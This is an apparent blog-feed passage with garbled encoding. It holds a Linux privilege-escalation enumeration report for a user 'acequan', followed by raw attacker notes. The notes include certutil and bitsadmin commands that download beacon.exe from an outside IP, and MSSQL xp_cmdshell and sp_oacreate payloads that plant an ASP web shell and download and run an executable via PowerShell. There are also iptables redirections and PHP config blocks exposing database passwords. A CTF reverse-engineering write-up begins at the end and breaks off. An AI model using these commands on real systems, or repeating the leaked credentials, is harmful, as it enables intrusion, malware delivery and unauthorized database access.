)=====<br>[!] nowar0 Should we question autocrats and their â€œmilitary operationsâ€?â€¦ yes!</p><hr><pre><code>                                  NO                                  WAR</code></pre><hr><p>==================================================================( users )=====<br>[i] usr000 Current user groupsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[<em>] usr010 Is current user in an administrative group?â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[</em>] usr020 Are there other users in administrative groups?â€¦â€¦â€¦â€¦â€¦.. yes!<br>[<em>] usr030 Other users with shellâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[i] usr040 Environment informationâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] usr050 Groups for other usersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] usr060 Other usersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[</em>] usr070 PATH variables defined inside /etcâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[!] usr080 Is â€˜.â€™ in a PATH variable defined inside /etc?â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>===================================================================( sudo )=====<br>[!] sud000 Can we sudo without a password?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] sud010 Can we list sudo commands without a password?â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[<em>] sud040 Can we read sudoers files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[</em>] sud050 Do we know if any other users used sudo?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>============================================================( file system )=====<br>[<em>] fst000 Writable files outside userâ€™s homeâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[</em>] fst010 Binaries with setuid bitâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[!] fst020 Uncommon setuid binariesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!</p><hr><p>/snap/snapd/17029/usr/lib/snapd/snap-confine<br>/snap/snapd/17336/usr/lib/snapd/snap-confine</p><hr><p>[!] fst030 Can we write to any setuid binary?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] fst040 Binaries with setgid bitâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[!] fst050 Uncommon setgid binariesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[!] fst060 Can we write to any setgid binary?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[</em>] fst070 Can we read /root?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[<em>] fst080 Can we read subdirectories under /home?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[</em>] fst090 SSH files in home directoriesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] fst100 Useful binariesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[</em>] fst110 Other interesting files in home directoriesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] fst120 Are there any credentials in fstab/mtab?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] fst130 Does â€˜acequanâ€™ have mail?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] fst140 Can we access other users mail?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] fst150 Looking for GIT/SVN repositoriesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] fst160 Can we write to critical files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] fst170 Can we write to critical directories?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] fst180 Can we write to directories from PATH defined in /etc?â€¦â€¦â€¦. nope<br>[!] fst190 Can we read any backup?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. yes!</p><hr><p>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  8 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.3.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  9 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.2.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  5 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.6.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  7 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.4.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ 11 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.0.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ 10 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.1.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ 12 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  6 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.5.zip</p><hr><p>[!] fst200 Are there possible credentials in any shell history file?â€¦â€¦. nope<br>[!] fst210 Are there NFS exports with â€˜no_root_squashâ€™ option?â€¦â€¦â€¦â€¦. nope<br>[<em>] fst220 Are there NFS exports with â€˜no_all_squashâ€™ option?â€¦â€¦â€¦â€¦.. nope<br>[i] fst500 Files owned by user â€˜acequanâ€™â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] fst510 SSH files anywhereâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] fst520 Check hosts.equiv file and its contentsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] fst530 List NFS server sharesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] fst540 Dump fstab fileâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>=================================================================( system )=====<br>[i] sys000 Who is logged inâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] sys010 Last logged in usersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[!] sys020 Does the /etc/passwd have hashes?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sys022 Does the /etc/group have hashes?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sys030 Can we read shadow files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] sys040 Check for other superuser accountsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] sys050 Can root user log in via SSH?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[i] sys060 List available shellsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] sys070 System umask in /etc/login.defsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] sys080 System password policies in /etc/login.defsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>===============================================================( security )=====<br>[</em>] sec000 Is SELinux present?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] sec010 List files with capabilitiesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[!] sec020 Can we write to a binary with caps?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sec030 Do we have all caps in any binary?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] sec040 Users with associated capabilitiesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] sec050 Does current user have capabilities?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[!] sec060 Can we read the auditd log?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>========================================================( recurrent tasks )=====<br>[<em>] ret000 User crontabâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] ret010 Cron tasks writable by userâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[</em>] ret020 Cron jobsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[<em>] ret030 Can we read user crontabsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] ret040 Can we list other user cron tasks?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] ret050 Can we write to any paths present in cron jobsâ€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[!] ret060 Can we write to executable paths present in cron jobsâ€¦â€¦â€¦.. nope<br>[i] ret400 Cron filesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[</em>] ret500 User systemd timersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] ret510 Can we write in any system timer?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[i] ret900 Systemd timersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>================================================================( network )=====<br>[<em>] net000 Services listening only on localhostâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[!] net010 Can we sniff traffic with tcpdump?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[i] net500 NIC and IP informationâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] net510 Routing tableâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] net520 ARP tableâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] net530 Nameserversâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] net540 Systemd Nameserversâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] net550 Listening TCPâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] net560 Listening UDPâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>===============================================================( services )=====<br>[!] srv000 Can we write in service files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] srv010 Can we write in binaries executed by services?â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] srv020 Files in /etc/init.d/ not belonging to rootâ€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] srv030 Files in /etc/rc.d/init.d not belonging to rootâ€¦â€¦â€¦â€¦â€¦.. nope<br>[</em>] srv040 Upstart files not belonging to rootâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] srv050 Files in /usr/local/etc/rc.d not belonging to rootâ€¦â€¦â€¦â€¦.. nope<br>[i] srv400 Contents of /etc/inetd.confâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] srv410 Contents of /etc/xinetd.confâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] srv420 List /etc/xinetd.d if usedâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] srv430 List /etc/init.d/ permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] srv440 List /etc/rc.d/init.d permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] srv450 List /usr/local/etc/rc.d permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] srv460 List /etc/init/ permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[!] srv500 Can we write in systemd service files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] srv510 Can we write in binaries executed by systemd services?â€¦â€¦â€¦. nope<br>[</em>] srv520 Systemd files not belonging to rootâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[i] srv900 Systemd config files permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>===============================================================( software )=====<br>[!] sof000 Can we connect to MySQL with root/root credentials?â€¦â€¦â€¦â€¦. nope<br>[!] sof010 Can we connect to MySQL as root without password?â€¦â€¦â€¦â€¦â€¦ nope<br>[!] sof015 Are there credentials in mysql_history file?â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?â€¦.. nope<br>[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?â€¦.. nope<br>[*] sof030 Installed apache modulesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof040 Found any .htpasswd files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sof050 Are there private keys in ssh-agent?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof060 Are there gpg keys cached in gpg-agent?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof070 Can we write to a ssh-agent socket?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope</p><h2 id="sof080-Can-we-write-to-a-gpg-agent-socket-â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦-yes"><a href="#sof080-Can-we-write-to-a-gpg-agent-socket-â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦-yes" class="headerlink" title="[!] sof080 Can we write to a gpg-agent socket?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. yes!"></a>[!] sof080 Can we write to a gpg-agent socket?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. yes!</h2><p>/run/user/1000/gnupg/S.gpg-agent<br>/run/user/1000/gnupg/S.gpg-agent.ssh<br>/run/user/1000/gnupg/S.gpg-agent.extra<br>/run/user/1000/gnupg/S.gpg-agent.browser</p><hr><p>[!] sof090 Found any keepass database files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof100 Found any â€˜passâ€™ store directories?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sof110 Are there any tmux sessions available?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] sof120 Are there any tmux sessions from other users?â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof130 Can we write to tmux session sockets from other users?â€¦â€¦â€¦. nope<br>[!] sof140 Are any screen sessions available?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] sof150 Are there any screen sessions from other users?â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sof160 Can we write to screen session sockets from other users?â€¦â€¦.. nope<br>[<em>] sof170 Can we access MongoDB databases without credentials?â€¦â€¦â€¦â€¦ nope<br>[i] sof500 Sudo versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] sof510 MySQL versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] sof520 Postgres versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] sof530 Apache versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] sof540 Tmux versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] sof550 Screen versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>=============================================================( containers )=====<br>[</em>] ctn000 Are we in a docker container?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] ctn010 Is docker available?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] ctn020 Is the user a member of the â€˜dockerâ€™ group?â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] ctn200 Are we in a lxc container?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] ctn210 Is the user a member of any lxc/lxd group?â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!</p><hr><h2 id="acequan-adm-cdrom-sudo-dip-plugdev-lpadmin-lxd-sambashare"><a href="#acequan-adm-cdrom-sudo-dip-plugdev-lpadmin-lxd-sambashare" class="headerlink" title="acequan adm cdrom sudo dip plugdev lpadmin lxd sambashare"></a>acequan adm cdrom sudo dip plugdev lpadmin lxd sambashare</h2><p>==============================================================( processes )=====<br>[i] pro000 Waiting for the process monitor to finishâ€¦â€¦â€¦â€¦â€¦â€¦â€¦.. yes!<br>[i] pro001 Retrieving process binariesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[i] pro002 Retrieving process usersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[!] pro010 Can we write in any process binary?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] pro020 Processes running with root permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[</em>] pro030 Processes running by non-root users with shellâ€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[i] pro500 Running processesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] pro510 Running process binaries and permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>===================================================================( CVEs )=====<br>In order to test for CVEs, download lse.sh from the GitHub releases page.<br>Alternatively, build lse_cve.sh using tools/package_cvs_into_lse.sh from the repository.</p><p>==================================( FINISHED )==================================<br>$ lxc init ubuntu: ignite -c security.privileged=true</p><p>certutil -urlcache -split -f <a href="http://192.168.144.129/beacon.exe">http://192.168.144.129/beacon.exe</a> C:\xxx.exe</p><p>iptables -A PREROUTING -p tcp -d 192.168.111.131 â€“dport 822 -j DNAT â€“to-destination 192.168.1.88:8080</p><p>iptables -A POSTROUTING -p tcp -d 192.168.1.88 â€“dport 8080 -j SNAT â€“to-source 192.168.111.131</p><p>define(â€˜DB_HOSTâ€™, â€˜localhostâ€™); //æ•°æ®åº“æœåŠ¡å™¨åœ°å€<br>define(â€˜DB_USERâ€™, â€˜fk_huoxingtu_cnâ€™);  //æ•°æ®åº“ç”¨æˆ·å<br>define(â€˜DB_PWDâ€™, â€˜haK6eF4jxw3YKDEWâ€™);//æ•°æ®åº“å¯†ç <br>define(â€˜DB_NAMEâ€™, â€˜fk_huoxingtu_cnâ€™);  //æ•°æ®åº“åç§°<br>define(â€˜DB_PORTâ€™, â€˜3306â€™);  //æ•°æ®åº“ç«¯å£</p><p>define(â€˜IN_DBHOSTâ€™, â€˜127.0.0.1â€™);<br>define(â€˜IN_DBUSERâ€™, â€˜fenfaâ€™);<br>define(â€˜IN_DBPWâ€™, â€˜yEAnzRb6dMMBtZ47â€™);<br>define(â€˜IN_DBNAMEâ€™, â€˜fenfaâ€™);</p><p>execute master..xp_dirtree â€˜c:â€™,1,1</p><p>exec master..xp_cmdshell â€˜net userâ€™ ;<br>bitsadmin /transfer n <a href="https://www.baidu.com/robots.txt">https://www.baidu.com/robots.txt</a> c:a.txt<br>c:\users\Administrator\desktop\a.txt</p><p>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate â€˜scripting.filesystemobjectâ€™, @o out<br>exec sp_oamethod @o, â€˜createtextfileâ€™, @f out, â€˜c:\inetpub\wwwroot\s.jspâ€™, 1<br>exec @ret = sp_oamethod @f, â€˜writelineâ€™, NULL,â€™&lt;%execute(request(â€œaâ€))%&gt;â€™</p><p>exec master..xp_cmdshell â€˜â€œecho $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(â€œ<a href="http://example/test0.exe&quot;,&quot;%TEMP%/test.exe&quot;">http://example/test0.exe&quot;,&quot;%TEMP%\test.exe&quot;</a>) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create â€œ%TEMP%\test.exeâ€â€â€˜</p><p>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate â€˜scripting.filesystemobjectâ€™, @o out<br>exec sp_oamethod @o, â€˜createtextfileâ€™, @f out, â€˜C:\inetpub\wwwroot\s.jspâ€™, 1<br>exec @ret = sp_oamethod @f, â€˜writelineâ€™, NULL,â€™&lt;%execute(request(â€œaâ€))%&gt;â€™<br>exec master..xp_cmdshell â€˜dir c:\inetpub\wwwroot&#39; ;</p><p>exec master..xp_cmdshell â€˜â€œecho $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(â€œ<a href="http://ip/chunqiu.exe&quot;,&quot;%TEMP%/test.exe&quot;">http://ip/chunqiu.exe&quot;,&quot;%TEMP%\test.exe&quot;</a>) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create â€œ%TEMP%\test.exeâ€â€â€˜</p><p>certutil -urlcache -split -f <a href="http://ip/chunqiu.exe">http://ip/chunqiu.exe</a> c:\a.exe</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023å…¬å¼€èµ›é“WEEK2</title>
      <link href="/2023/11/13/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/"/>
      <url>/2023/11/13/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/</url>
      
        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-å…¬å¼€èµ›é“-WEEK2"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-WEEK2" class="headerlink" title="NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK2"></a>NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK2</h3><h4 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h4><h5 id="WEEK2-REVERSE-PZthon"><a href="#WEEK2-REVERSE-PZthon" class="headerlink" title="WEEK2|REVERSE PZthon"></a>WEEK2|REVERSE PZthon</h5><p><img src="/images/xinshengsai/image-20231113141154075.png" alt="image-20231113141154075"></p><p>ä¸‹è½½æ–‡ä»¶ï¼Œçœ‹èµ·æ¥åƒæ˜¯pyæ–‡ä»¶ï¼Œpyæ–‡ä»¶çš„è¯æ‹–idaæ˜¯ä¸è¡Œçš„ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸è¡Œï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œå¤§ä½¬è¯´çš„ï¼Œ</p><p><img src="/images/xinshengsai/image-20231113141300930.png" alt="image-20231113141300930"></p><p>æ‹–åˆ°idaé‡Œï¼Œä¹Ÿä¸è¡Œï¼Œå¤ªå¤šä¸œè¥¿äº†ã€‚</p><p><code>https://github.com/extremecoders-re/pyinstxtractor</code></p><p>å¯ä»¥ä½¿ç”¨è¿™ä¸ªpython exe åç¼–è¯‘å·¥å…·è¿›è¡Œåç¼–è¯‘ï¼Œ</p><p><code>python3 .\pyinstxtractor.py ..\PZthon\PZthon.exe</code></p><p>è§£å‡ºæ¥ä¹‹åä¼šçœ‹åˆ°è¿™ä¸ªæ–‡ä»¶åçš„ä»¥pycä¸ºåç¼€çš„æ–‡ä»¶ï¼Œæ‹¿åˆ°è¿™ä¸ªpycåç¼–è¯‘çš„ç½‘ç«™ï¼Œ<code>https://tool.lu/pyc/</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 